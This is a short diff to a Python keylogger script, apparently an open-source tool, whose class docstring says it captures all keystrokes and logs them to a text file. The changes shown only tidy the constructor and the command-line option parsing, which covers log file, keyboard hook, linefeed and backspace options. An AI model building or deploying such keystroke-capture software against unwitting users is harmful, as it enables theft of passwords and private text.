@@ -9,7 +9,7 @@ import traceback
 class KeyLogger:
     ''' Captures all keystrokes, and logs them to a text file
     '''
-    def __init__(self): # hookKeyboard=1, hookMouse=0, exitKey="F12", flushKey="F11", filename="C:\Temp\log.txt", addLineFeed=0, parseBackspace=0, parseEscape=0, debug=0):
+    def __init__(self): 
         
         self.ParseOptions()
         
@@ -97,8 +97,8 @@ class KeyLogger:
     
     def ParseOptions(self):
         #usage = "usage: %prog [options] arg"
-        parser = OptionParser()
-        parser.add_option("-f", "--file", action="store", dest="filename", help="write log data to FILENAME")
+        parser = OptionParser(version="%prog version 0.3")
+        parser.add_option("-f", "--file", action="store", dest="filename", help="write log data to FILENAME [default: %default]")
         parser.add_option("-k", "--keyboard", action="store_true", dest="hookKeyboard", help="log keyboard input (default)")
         parser.add_option("-a", "--addlinefeed", action="store_true", dest="addLineFeed", help="add linefeed [\\n] character when carriage return [\\r] character is detected [for Notepad compatibility]")
         parser.add_option("-b", "--parsebackspace", action="store_true", dest="parseBackspace", help="translate backspace chacarter into printable string")
